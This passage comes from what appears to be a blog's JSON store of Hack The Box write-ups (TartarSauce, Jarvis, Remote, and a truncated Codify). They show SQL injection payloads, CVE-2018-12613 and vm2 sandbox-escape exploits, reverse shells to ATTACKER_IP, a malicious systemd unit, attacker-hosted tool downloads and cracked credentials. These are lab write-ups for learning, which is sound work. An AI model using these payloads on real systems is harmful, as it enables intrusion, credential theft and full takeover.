found</code>.</p>\n</blockquote>\n<pre><code class=\"language-bash\"># Install if needed\nsudo apt install gcc-multilib\n</code></pre>\n<p><strong>2. Transfer the binary and insert it into the malicious archive</strong>:</p>\n<pre><code class=\"language-bash\"># On target, copy evil to /tmp/var/www/html/\nonuma@TartarSauce:/tmp$ wget http://10.10.14.139/evil -O /tmp/var/www/html/evil\n</code></pre>\n<p><strong>3. Create the archive with owner root</strong> (the flag <code>--owner=root --group=root</code> sets ownership in the archive):</p>\n<pre><code class=\"language-bash\">onuma@TartarSauce:/var/tmp$ /bin/tar -zcvf html -C /tmp var/www/html --owner=root --group=root\n</code></pre>\n<p><strong>4. Updated script <code>pwn.sh</code></strong> — same principle as <code>try.sh</code>:</p>\n<pre><code class=\"language-bash\">#!/bin/bash\n/bin/tar -zcvf html -C /tmp var/www/html --owner=root --group=root\nsleep 3\nls -a | grep '^\\.[^.]' &gt; hash.txt\nzip=$(cat hash.txt)\nrm $zip\nmv html /var/tmp/$zip\n</code></pre>\n<p><strong>5. After replacement</strong>, <code>backuperer</code> extracts the archive as root in <code>/var/tmp/check/</code>. The <code>evil</code> binary is extracted with <strong>root</strong> ownership and SUID bit preserved:</p>\n<pre><code class=\"language-bash\">onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la evil\n-r-sr-sr-x 1 root root 748996 Mar 19 21:39 evil\nonuma@TartarSauce:/var/tmp/check/var/www/html$ ./evil\nroot@TartarSauce:/var/tmp/check/var/www/html# whoami\nroot\n</code></pre>\n<p><strong>Root cause</strong>: <code>backuperer</code> runs <code>tar -zxvf</code> as root without <code>--no-same-owner</code> and without <code>--no-same-permissions</code>, so ownership and permissions (including SUID bit) from the archive are preserved on extraction.</p>"
    },
    {
      "title": "Jarvis",
      "slug": "jarvis",
      "date": "2026·03·14",
      "tags": [
        "htb",
        "medium",
        "linux",
        "sqli",
        "union-injection",
        "phpmyadmin"
      ],
      "desc": "Open ports: - 22/tcp — OpenSSH 7.4p1 - 80/tcp — Apache 2.4.25 — Stark Hotel website - 64999/tcp — Apache 2.4.25 — displays \"Hey you have been banned for 90 seconds, don't be bad\"",
      "body": "<h1 id=\"jarvis-hack-the-box\">Jarvis // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Medium</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.10.10.143</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>jarvis.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/Apache (80), HTTP/Apache (64999)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan jarvis.htb\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> — OpenSSH 7.4p1\n- <strong>80/tcp</strong> — Apache 2.4.25 — Stark Hotel website\n- <strong>64999/tcp</strong> — Apache 2.4.25 — displays \"Hey you have been banned for 90 seconds, don't be bad\"</p>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<p>Port 80 serves a hotel website (Stark Hotel). Custom header <code>IronWAF 2.0.3</code> detected — behavioral WAF that monitors request patterns and bans IPs via iptables redirection to port 64999.</p>\n<p>The application uses <code>room.php?cod=</code> to select and display individual hotel rooms — a dynamic parameter interacting with the database.</p>\n<p><strong>phpMyAdmin</strong> found at <code>/phpmyadmin/</code> — version <strong>4.8.0</strong>, vulnerable to CVE-2018-12613 (LFI → RCE). Requires authentication.</p>\n<hr>\n<h2 id=\"foothold-sql-injection-in-roomphp\">Foothold // SQL Injection in room.php</h2>\n<blockquote>\n<p>Deep dive: UNION-Based SQL Injection</p>\n<p><strong>Vulnerability</strong><br>\n<strong>UNION-based SQL injection</strong> in <code>room.php?cod=</code> parameter. The parameter is passed directly into a SQL query without sanitization. User-controlled input selects a room by ID and the result is reflected in the page HTML, enabling UNION-based data extraction.</p>\n<p><strong>Structural root cause:</strong> unsanitized user input concatenated directly into SQL query. No parameterized queries or prepared statements.</p>\n</blockquote>\n<h3 id=\"injection-confirmation\">Injection confirmation</h3>\n<pre><code>GET /room.php?cod=1+AND+IF(1=1,SLEEP(5),0)\n# Response delayed 5 seconds → confirmed injectable\n</code></pre>\n<h3 id=\"column-count-determination\">Column count determination</h3>\n<pre><code>GET /room.php?cod=1+ORDER+BY+7   → 200 OK\nGET /room.php?cod=1+ORDER+BY+8   → different response\n# 7 columns in the query\n</code></pre>\n<h3 id=\"reflected-column-identification\">Reflected column identification</h3>\n<pre><code>GET /room.php?cod=9999+UNION+SELECT+1,2,3,4,5,6,7\n</code></pre>\n<p>Non-existent <code>cod=9999</code> forces empty original result. Numeric markers reveal which positions render in the page.</p>\n<h3 id=\"database-enumeration\">Database enumeration</h3>\n<pre><code>GET /room.php?cod=9999+UNION+SELECT+NULL,GROUP_CONCAT(schema_name),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.schemata\n</code></pre>\n<h3 id=\"credential-extraction\">Credential extraction</h3>\n<pre><code>GET /room.php?cod=9999+UNION+SELECT+NULL,GROUP_CONCAT(User,&quot;:&quot;,Password),NULL,NULL,NULL,NULL,NULL+FROM+mysql.user\n</code></pre>\n<p>Result: <code>DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0</code></p>\n<p>MySQL SHA1 hash cracked via CrackStation: <strong>imissyou</strong></p>\n<h3 id=\"phpmyadmin-access\">phpMyAdmin access</h3>\n<p>Logged into phpMyAdmin at <code>/phpmyadmin/</code> with credentials <code>DBadmin:imissyou</code>.</p>\n<h3 id=\"rce-via-cve-2018-12613-lfi-in-phpmyadmin-480\">RCE via CVE-2018-12613 (LFI in phpMyAdmin 4.8.0)</h3>\n<blockquote>\n<p><strong>Vulnerability — CVE-2018-12613</strong><br>\n<strong>phpMyAdmin 4.8.0</strong> — Local File Inclusion via the <code>target</code> parameter in <code>index.php</code>. The LFI can be chained with SQL query execution to achieve RCE by including PHP session files that contain attacker-controlled SQL output.</p>\n<p><strong>Structural root cause:</strong> insufficient validation of the <code>target</code> parameter allows path traversal using double URL-encoded <code>?</code> (<code>%253f</code>) to bypass the whitelist check. phpMyAdmin validates that the <code>target</code> parameter matches a known script name, but the <code>%253f</code> is decoded to <code>%3f</code> by Apache, then to <code>?</code> by PHP — splitting the path so the server includes the traversal path while phpMyAdmin sees a whitelisted script name.</p>\n<p>Ref: https://nvd.nist.gov/vuln/detail/CVE-2018-12613</p>\n</blockquote>\n<p>Exploit used: <code>exploit.py</code> (CVE-2018-12613 RCE by samguy). The exploit chain:</p>\n<ol>\n<li>Authenticates to phpMyAdmin with <code>DBadmin:imissyou</code></li>\n<li>Executes a SQL query that writes a PHP webshell (<code>&lt;?php system(\"COMMAND\") ?&gt;</code>) into the session data</li>\n<li>Triggers the LFI via <code>index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_SESSION_ID</code></li>\n<li>The PHP session file is included and the embedded webshell executes the command</li>\n</ol>\n<h3 id=\"reverse-shell\">Reverse shell</h3>\n<blockquote>\n<p><strong>bash -c for reverse shells through system()</strong><br>\nThe exploit executes a single command via <code>system()</code>. To obtain an interactive reverse shell, the command must be wrapped in <code>bash -c</code> — without it, shell-specific syntax (redirections, <code>&gt;&amp;</code>, <code>/dev/tcp</code>) is interpreted by <code>system()</code> (which invokes <code>/bin/sh</code>) and fails silently.</p>\n</blockquote>\n<pre><code class=\"language-bash\">python3 exploit.py 10.10.10.143 80 /phpmyadmin DBadmin imissyou 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/443 0&gt;&amp;1&quot;'\n</code></pre>\n<pre><code class=\"language-bash\"># Listener on attacker\nnc -nvlp 443\n</code></pre>\n<p>Shell obtained as <strong>www-data</strong>.</p>\n<hr>\n<h2 id=\"lateral-movement-www-data-pepper\">Lateral Movement // www-data → pepper</h2>\n<h3 id=\"sudo-l-as-www-data\">sudo -l as www-data</h3>\n<pre><code class=\"language-bash\">www-data@jarvis:$ sudo -l\nUser www-data may run the following commands on jarvis:\n    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py\n</code></pre>\n<p>www-data can run <code>simpler.py</code> as <strong>pepper</strong> without password.</p>\n<h3 id=\"command-injection-in-simplerpy\">Command injection in simpler.py</h3>\n<p>The script provides a ping functionality (<code>-p</code> flag) that takes a user-supplied IP address and passes it to <code>os.system()</code>. The vulnerable function:</p>\n<pre><code class=\"language-python\">def exec_ping():\n    forbidden = ['&amp;', ';', '-', '`', '||', '|']\n    command = input('Enter an IP: ')\n    for i in forbidden:\n        if i in command:\n            print('Got you')\n            exit()\n    os.system('ping ' + command)\n</code></pre>\n<p>The blacklist filters <code>&amp;</code>, <code>;</code>, <code>-</code>, backticks, <code>||</code>, and <code>|</code> — but does <strong>not</strong> filter <code>$()</code> command substitution.</p>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Command injection</strong> via <code>$()</code> command substitution syntax. The filter blocks common shell operators but does <strong>not</strong> filter <code>$()</code>, which bash evaluates before passing to the command.</p>\n<p><strong>Structural root cause:</strong> incomplete input validation — blacklist approach instead of whitelist. The script filters known-bad characters but misses <code>$()</code> substitution syntax. A whitelist allowing only digits and dots (<code>[0-9.]</code>) would have prevented all injection vectors.</p>\n</blockquote>\n<h3 id=\"exploitation\">Exploitation</h3>\n<p>The <code>-</code> character is blacklisted, which blocks most reverse shell one-liners (<code>nc -e</code>, <code>bash -i</code>, etc.). Workaround: compile a static ELF binary that performs the reverse shell connection without needing <code>-</code> in its invocation.</p>\n<pre><code class=\"language-bash\"># On attacker // create reverse shell binary\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;ATTACKER_IP&gt; LPORT=443 -f elf -o test.elf\n# Transfer to target via wget (hosted with python3 -m http.server)\n</code></pre>\n<pre><code class=\"language-bash\"># On target as www-data\nsudo -u pepper /var/www/Admin-Utilities/simpler.py -p\nEnter an IP: &lt;ATTACKER_IP&gt;$(/tmp/test.elf)\n</code></pre>\n<p>The <code>$()</code> substitution executes <code>/tmp/test.elf</code> as pepper before the ping command runs.</p>\n<h3 id=\"reverse-shell-as-pepper\">Reverse shell as pepper</h3>\n<pre><code class=\"language-bash\">nc -nvlp 443\n# connect from target → shell as pepper\n</code></pre>\n<p><strong>User flag:</strong></p>\n<pre><code class=\"language-bash\">pepper@jarvis:~$ cat user.txt\n</code></pre>\n<p>Flag obtained.</p>\n<hr>\n<h2 id=\"privilege-escalation-pepper-root\">Privilege Escalation // pepper → root</h2>\n<h3 id=\"enumeration-as-pepper\">Enumeration as pepper</h3>\n<pre><code class=\"language-bash\">pepper@jarvis:$ sudo -l\n# Requires password // no sudo access\n\npepper@jarvis:$ find / -perm -4000 -type f 2&gt;/dev/null\n/bin/systemctl    ← SUID root\n/bin/fusermount\n/bin/mount\n/bin/ping\n/bin/umount\n/bin/su\n...\n</code></pre>\n<p><code>/bin/systemctl</code> has the <strong>SUID bit</strong> set — it runs with root privileges regardless of who executes it.</p>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>SUID systemctl</strong> — <code>systemctl</code> with the SUID bit allows any user to create, enable, and start arbitrary systemd services that execute as root. An attacker creates a malicious <code>.service</code> unit with <code>ExecStart</code> pointing to a reverse shell, enables it, and starts it — obtaining a root shell.</p>\n<p><strong>Structural root cause:</strong> <code>systemctl</code> should never have the SUID bit. Systemd service management is a root-only operation by design. Setting SUID on this binary grants any local user the ability to define and execute arbitrary code as root through service unit files.</p>\n<p>Ref: https://gtfobins.github.io/gtfobins/systemctl/</p>\n</blockquote>\n<h3 id=\"malicious-service-creation\">Malicious service creation</h3>\n<pre><code class=\"language-bash\">pepper@jarvis:/dev/shm$ cat root.service\n[Unit]\nDescription=roooooooooot\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER_IP&gt;/9999 0&gt;&amp;1'\n\n[Install]\nWantedBy=multi-user.target\n</code></pre>\n<h3 id=\"service-activation\">Service activation</h3>\n<pre><code class=\"language-bash\">pepper@jarvis:/dev/shm$ /bin/systemctl enable /dev/shm/root.service\nCreated symlink /etc/systemd/system/multi-user.target.wants/root.service → /dev/shm/root.service.\nCreated symlink /etc/systemd/system/root.service → /dev/shm/root.service.\n\npepper@jarvis:/dev/shm$ /bin/systemctl start root\n</code></pre>\n<h3 id=\"root-shell\">Root shell</h3>\n<pre><code class=\"language-bash\">nc -nvlp 9999\n# connect from target → shell as root\n</code></pre>\n<pre><code class=\"language-bash\">root@jarvis:~# cat /root/root.txt\n</code></pre>\n<p>Flag obtained.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code class=\"language-text\">Nmap → 3 ports (22, 80, 64999)\n  ↓\nroom.php?cod= → UNION SQLi → DBadmin:imissyou\n  ↓\nphpMyAdmin 4.8.0 → CVE-2018-12613 (LFI → RCE) → bash -c reverse shell → www-data\n  ↓\nsudo -u pepper simpler.py → command injection via $() → test.elf reverse shell → pepper\n  ↓\nSUID /bin/systemctl → malicious .service → reverse shell → root\n</code></pre>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> (obtained as pepper via command injection)</li>\n<li><strong>Root:</strong> (obtained via SUID systemctl service abuse)</li>\n</ul>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ul>\n<li><strong>UNION SQLi requires empty original result:</strong> if the original query returns data, the UNION row is silently discarded. Always use a non-existent ID (<code>cod=9999</code>) to force the application to render injected data. See UNION-Based SQL Injection.</li>\n<li><strong>Blacklist filters are inherently incomplete:</strong> simpler.py blocked <code>&amp;</code>, <code>;</code>, <code>-</code>, backticks, <code>|</code> but missed <code>$()</code> command substitution. A whitelist (<code>[0-9.]</code>) would have been unbreakable. When encountering a blacklist, enumerate what's <em>allowed</em>, not what's blocked.</li>\n<li><strong>SUID binaries — always check GTFOBins:</strong> after <code>find / -perm -4000</code>, cross-reference every result against <a href=\"https://gtfobins.github.io/\">GTFOBins</a>. Open the SUID list and check each binary one by one. Standard binaries like <code>mount</code>, <code>ping</code>, <code>su</code> are expected SUID — anything else (like <code>systemctl</code>) is immediately suspicious.</li>\n<li><strong><code>bash -c</code> for shell syntax through <code>system()</code>:</strong> PHP's <code>system()</code> invokes <code>/bin/sh</code>, which may not support bash-specific syntax (<code>&gt;&amp;</code>, <code>/dev/tcp</code>). Wrapping in <code>bash -c \"...\"</code> ensures bash interprets the command.</li>\n<li><strong>ELF binaries bypass character blacklists:</strong> when a filter blocks <code>-</code> or other characters essential for reverse shells, a precompiled binary (msfvenom ELF payload) needs no arguments — just execute it.</li>\n</ul>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><strong>Total time:</strong></li>\n<li><strong>Where I spent the most time:</strong> SQL injection — understanding UNION-based extraction, GROUP_CONCAT, and cross-database querying</li>\n<li><strong>Subjective difficulty:</strong> /10</li>\n</ul>"
    },
    {
      "title": "Remote",
      "slug": "remote",
      "date": "2026·03·13",
      "tags": [
        "htb",
        "easy",
        "windows",
        "nfs",
        "umbraco",
        "sha1"
      ],
      "desc": "Open ports: - 21/tcp // FTP — Microsoft ftpd, anonymous login allowed (empty, no write) - 80/tcp // HTTP — \"Acme Widgets\" website running Umbraco CMS - 111/tcp // rpcbind — NFS services registered (mountd, nlockmgr, status) - 135/139/445 // SMB/RPC — signing enabled but not…",
      "body": "<h1 id=\"remote-hack-the-box\">Remote // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Windows</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.x.x</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>remote.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>FTP (21), HTTP (80), RPC (111), SMB (135/139/445), NFS (2049), WinRM (5985)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA scan/nmap.scan remote.htb\n</code></pre>\n<pre><code>PORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n111/tcp   open  rpcbind       2-4 (RPC #100000)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds?\n2049/tcp  open  nlockmgr      1-4 (RPC #100021)\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0\n</code></pre>\n<p>Open ports:\n- <strong>21/tcp</strong> // FTP — Microsoft ftpd, <strong>anonymous login allowed</strong> (empty, no write)\n- <strong>80/tcp</strong> // HTTP — \"Acme Widgets\" website running <strong>Umbraco CMS</strong>\n- <strong>111/tcp</strong> // rpcbind — NFS services registered (mountd, nlockmgr, status)\n- <strong>135/139/445</strong> // SMB/RPC — signing enabled but <strong>not required</strong>, no null session access\n- <strong>2049/tcp</strong> // <strong>NFS</strong> — critical attack surface\n- <strong>5985/tcp</strong> // <strong>WinRM</strong> — potential remote shell with valid credentials</p>\n<h3 id=\"ftp-enumeration\">FTP Enumeration</h3>\n<p>Anonymous login allowed but the root directory is empty and write permissions are denied. Dead end.</p>\n<h3 id=\"smb-enumeration\">SMB Enumeration</h3>\n<p>No accessible shares with null session. Dead end.</p>\n<h3 id=\"nfs-enumeration\">NFS Enumeration</h3>\n<pre><code class=\"language-bash\">showmount -e remote.htb\n</code></pre>\n<pre><code>Export list for remote.htb:\n/site_backups (everyone)\n</code></pre>\n<p>The <code>/site_backups</code> share is accessible to everyone — this is a full backup of the Umbraco web application.</p>\n<pre><code class=\"language-bash\">sudo mount -t nfs remote.htb:/site_backups /mnt/\n</code></pre>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<p>The web application on port 80 is an Umbraco CMS instance. Directory enumeration with feroxbuster revealed:</p>\n<ul>\n<li><code>/umbraco</code> — admin login panel</li>\n<li><code>/install</code> — redirects to <code>/umbraco/</code></li>\n<li><code>/intranet</code>, <code>/blog</code>, <code>/products</code>, <code>/people</code>, <code>/contact</code> — content pages</li>\n</ul>\n<p>The NFS backup confirms the exact Umbraco version and provides direct access to application data files.</p>\n<hr>\n<h2 id=\"foothold-umbraco-authenticated-rce\">Foothold // Umbraco Authenticated RCE</h2>\n<h3 id=\"credential-extraction-from-nfs-backup\">Credential Extraction from NFS Backup</h3>\n<p>The NFS share contains the full Umbraco application. The key file is the embedded database:</p>\n<pre><code class=\"language-bash\">strings /mnt/App_Data/Umbraco.sdf | grep -i admin@htb.local\n</code></pre>\n<pre><code>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.local\n</code></pre>\n<p>Three users found:\n- <code>admin@htb.local</code> — SHA1 hash: <code>b8be16afba8c314ad33d812f22a04991b90e2aaa</code>\n- <code>smith@htb.local</code> — HMACSHA256 hash (salted, not directly crackable)\n- <code>ssmith@htb.local</code> — HMACSHA256 hash (salted, not directly crackable)</p>\n<h3 id=\"hash-cracking\">Hash Cracking</h3>\n<pre><code class=\"language-bash\">echo 'b8be16afba8c314ad33d812f22a04991b90e2aaa' &gt; admin.sha1\nhashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt\n</code></pre>\n<pre><code>b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese\n</code></pre>\n<p>Credentials: <code>admin@htb.local:baconandcheese</code></p>\n<h3 id=\"umbraco-rce-exploit-db-46153\">Umbraco RCE // Exploit-DB #46153</h3>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>Umbraco CMS 7.12.4</strong> — Authenticated remote code execution via XSLT stylesheet injection. The <code>/umbraco/developer/Xslt/xsltVisualize.aspx</code> endpoint allows authenticated administrators to upload and execute XSLT templates. A crafted XSLT payload containing inline C# code executes arbitrary commands on the server via <code>System.Diagnostics.Process</code>.</p>\n<p><strong>Structural root cause</strong>: the XSLT visualization feature trusts authenticated admin users to provide safe stylesheets, but XSLT supports embedded scripting (<code>msxsl:script</code>) that executes native code — no sandboxing or content filtering is applied.</p>\n<p>Ref: https://www.exploit-db.com/exploits/46153</p>\n</blockquote>\n<h3 id=\"exploitation\">Exploitation</h3>\n<p>Used a Python exploit for Umbraco authenticated RCE:</p>\n<pre><code class=\"language-bash\">python exploit.py -u admin@htb.local -p baconandcheese -w 'http://remote.htb' -i &lt;ATTACKER_IP&gt;\n</code></pre>\n<pre><code>[*] Logging in at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin\n[*] Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx\n[*] Switching to interactive mode\nPS C:\\windows\\system32\\inetsrv&gt;\n</code></pre>\n<p>Shell obtained as <code>iis apppool\\defaultapppool</code>.</p>\n<p><strong>User flag:</strong> obtained.</p>\n<hr>\n<h2 id=\"privilege-escalation-godpotato-seimpersonateprivilege\">Privilege Escalation // GodPotato (SeImpersonatePrivilege)</h2>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>SeImpersonatePrivilege abuse</strong> — IIS application pool accounts run with <code>SeImpersonatePrivilege</code>, which allows the process to impersonate any token it can obtain. GodPotato exploits the DCOM/RPCSS activation to coerce <code>NT AUTHORITY\\SYSTEM</code> into authenticating, then impersonates that token for arbitrary command execution as SYSTEM.</p>\n<p><strong>Structural root cause</strong>: Windows grants <code>SeImpersonatePrivilege</code> to service accounts by default. Combined with the ability to trigger DCOM object activation (which authenticates as SYSTEM), any service account can escalate to full system privileges.</p>\n</blockquote>\n<h3 id=\"exploitation_1\">Exploitation</h3>\n<pre><code class=\"language-bash\"># Transfer GodPotato to target\nPS C:\\Windows\\Temp&gt; curl.exe http://&lt;ATTACKER_IP&gt;/GodPotato-NET2.exe -o C:\\Windows\\Temp\\GodPotato.exe\n</code></pre>\n<pre><code class=\"language-bash\">PS C:\\Windows\\Temp&gt; ./GodPotato.exe -cmd &quot;cmd /c whoami&quot;\n</code></pre>\n<pre><code>[*] CurrentUser: NT AUTHORITY\\NETWORK SERVICE\n[*] Start Search System Token\n[*] PID : 848 Token:0x800  User: NT AUTHORITY\\SYSTEM ImpersonationLevel: Impersonation\n[*] Find System Token : True\n[*] CurrentUser: NT AUTHORITY\\SYSTEM\nnt authority\\system\n</code></pre>\n<h3 id=\"reverse-shell-as-system\">Reverse Shell as SYSTEM</h3>\n<p>Used GodPotato to execute a PowerShell reverse shell payload:</p>\n<pre><code class=\"language-bash\"># Listener on attacker\nnc -nvlp 443\n</code></pre>\n<pre><code>connect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [10.129.x.x] 49697\nPS C:\\Windows\\Temp&gt; whoami\nnt authority\\system\n</code></pre>\n<p><strong>Root flag:</strong> obtained.</p>\n<hr>\n<h2 id=\"attack-chain-summary\">Attack Chain Summary</h2>\n<pre><code>Nmap → 9 services, NFS share /site_backups accessible to everyone\n       ↓\n  Mount NFS → App_Data/Umbraco.sdf → admin@htb.local SHA1 hash\n       ↓\n  hashcat -m 100 → baconandcheese → Umbraco admin login\n       ↓\n  Umbraco authenticated RCE (XSLT injection) → shell as IIS AppPool\n       ↓\n  user.txt (C:\\Users\\Public\\user.txt)\n       ↓\n  SeImpersonatePrivilege → GodPotato → NT AUTHORITY\\SYSTEM\n       ↓\n  root.txt\n</code></pre>\n<h2 id=\"flags\">Flags</h2>\n<ul>\n<li><strong>User:</strong> obtained (as iis apppool\\defaultapppool)</li>\n<li><strong>Root:</strong> obtained (as nt authority\\system)</li>\n</ul>\n<h2 id=\"lessons-learned\">Lessons Learned</h2>\n<ul>\n<li><strong>NFS shares on Windows are rare and high-value:</strong> When NFS is exposed on a Windows host, it almost always contains sensitive data. Always check <code>showmount -e</code> and mount every available share.</li>\n<li><strong>Embedded databases in web app backups:</strong> Umbraco uses <code>.sdf</code> (SQL Server Compact) as an embedded database. <code>strings</code> is sufficient to extract hashes — no need for specialized tools. Always look in <code>App_Data/</code> for .NET applications.</li>\n<li><strong>SHA1 vs HMACSHA256:</strong> The admin account used plain SHA1 (hashcat mode 100, cracks instantly), while other accounts used salted HMACSHA256. Target the weakest hash algorithm first.</li>\n<li><strong>SeImpersonatePrivilege is a guaranteed SYSTEM path:</strong> Any Windows service account (IIS, MSSQL, etc.) with this privilege can escalate via potato attacks. Check <code>whoami /priv</code> immediately after landing a shell.</li>\n<li><strong>Umbraco XSLT RCE requires admin:</strong> The exploit targets the developer section's XSLT visualizer — only accessible to admin accounts. Lower-privilege Umbraco accounts (editors, writers) cannot trigger it.</li>\n</ul>\n<h2 id=\"timeline\">Timeline</h2>\n<ul>\n<li><strong>Total time:</strong> ~2h</li>\n<li><strong>Where I spent the most time:</strong> Credential hunting in the NFS share and troubleshooting Umbraco login (required machine restart)</li>\n<li><strong>Subjective difficulty:</strong> 3/10</li>\n</ul>"
    },
    {
      "title": "Codify",
      "slug": "codify",
      "date": "2026·03·06",
      "tags": [
        "htb",
        "easy",
        "linux",
        "node.js",
        "vm2",
        "cve-2023-30547"
      ],
      "desc": "Open ports: - 22/tcp // OpenSSH 8.9p1 Ubuntu - 80/tcp // Apache 2.4.52, reverse proxy to the Node.js web app - 3000/tcp // Node.js Express // web application for testing JavaScript code in a sandbox",
      "body": "<h1 id=\"codify-hack-the-box\">Codify // Hack The Box</h1>\n<table>\n<thead>\n<tr>\n<th>Info</th>\n<th>Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>OS</td>\n<td>Linux (Ubuntu)</td>\n</tr>\n<tr>\n<td>Difficulty</td>\n<td>Easy</td>\n</tr>\n<tr>\n<td>IP</td>\n<td>10.129.x.x</td>\n</tr>\n<tr>\n<td>Hostname</td>\n<td>codify.htb</td>\n</tr>\n<tr>\n<td>Services</td>\n<td>SSH (22), HTTP/Apache (80), Node.js Express (3000)</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2 id=\"enumeration\">Enumeration</h2>\n<h3 id=\"nmap\">Nmap</h3>\n<pre><code class=\"language-bash\">sudo nmap -Pn -sC -sV -p- -vvv -oA nmap.scan codify.htb\n</code></pre>\n<pre><code>PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n80/tcp   open  http    Apache httpd 2.4.52 (Ubuntu)\n3000/tcp open  http    Node.js Express framework\n</code></pre>\n<p>Open ports:\n- <strong>22/tcp</strong> // OpenSSH 8.9p1 Ubuntu\n- <strong>80/tcp</strong> // Apache 2.4.52, reverse proxy to the Node.js web app\n- <strong>3000/tcp</strong> // <strong>Node.js Express</strong> // web application for testing JavaScript code in a sandbox</p>\n<h3 id=\"web-enumeration\">Web Enumeration</h3>\n<p>The application on port 80/3000 is an online JavaScript code editor. The <code>/about</code> page reveals it uses the <strong>vm2</strong> library to execute code in a sandboxed environment.</p>\n<p>Identified version: <strong>vm2 3.9.16</strong> // a version known for critical sandbox escapes.</p>\n<hr>\n<h2 id=\"foothold-cve-2023-30547-vm2-sandbox-escape\">Foothold // CVE-2023-30547 (vm2 Sandbox Escape)</h2>\n<blockquote>\n<p><strong>Vulnerability</strong><br>\n<strong>vm2 &lt; 3.9.17</strong> // The vm2 library for Node.js creates a sandbox to run untrusted code. Versions up to 3.9.16 contain a flaw in the <code>handleException()</code> mechanism: an attacker can use a <code>Proxy</code> object with a custom <code>getPrototypeOf</code> trap to access the host context's <code>Error</code> object, escape the sandbox, and achieve RCE on the system.</p>\n<p><strong>Structural root cause</strong>: the sandbox catches exceptions with <code>try/catch</code>, but the exception's <code>__proto__</code> getter can be overridden via Proxy, allowing a reference to the host context to leak out of the sandbox.</p>\n<p>Ref: https://nvd.nist.gov/vuln/detail/CVE-2023-30547\nPoC: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</p>\n</blockquote>\n<h3 id=\"exploitation\">Exploitation</h3>\n<p>Payload entered directly into the web application's code editor:</p>\n<pre><code class=\"language-javascript\">const { VM } = require(&quot;vm2&quot;);\nconst vm = new VM();\n\nconst code = `\n  const err = new Error();\n  err.__proto__ = null;\n  const handler = {\n    getPrototypeOf(target) {\n      (function stack() {\n        new Error().stack;\n        stack();\n      })();\n    }\n  };\n  const proxiedErr = new Proxy(err, handler);\n  try {\n    throw proxiedErr;\n  } catch ({constructor: c}) {\n    c.constructor('return process')().mainModule.require('child_process').execSync('busybox nc &lt;ATTACKER_IP&gt; 443 -e /bin/bash');\n  }\n`;\n\nvm.run(code);\n</code></pre>\n<p>The payload uses a Proxy to intercept <code>getPrototypeOf</code> during the exception catch. When the sandbox attempts to resolve the error's prototype, the Proxy returns a reference to the host's <code>constructor</code>, which grants access to <code>process.mainModule.require('child_process')</code> for arbitrary command execution.</p>\n<h3 id=\"reverse-shell\">Reverse shell</h3>\n<pre><code class=\"language-bash\"># Listener on attacker\nnc -nvlp 443\n</code></pre>\n<pre><code>connect to [&lt;ATTACKER_IP&gt;] from (UNKNOWN) [10.129.x.x] 43210\nwhoami\nsvc\n</code></pre>\n<p>Shell 